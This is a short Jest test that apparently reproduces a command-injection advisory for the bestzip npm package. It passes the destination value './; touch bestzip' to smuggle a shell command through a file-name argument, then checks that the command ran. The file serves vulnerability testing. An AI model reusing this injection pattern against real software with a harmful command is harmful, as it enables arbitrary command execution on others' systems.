//https://github.com/advisories/GHSA-4qqc-mp5f-ccv4
test("Command Injection in bestzip", (done) => {
  expect.assertions(2);
  const zip = require("bestzip");
  const fs = require("fs");
  const path = "./bestzip";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  zip({
    source: "",
    destination: "./; touch bestzip",
  }).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
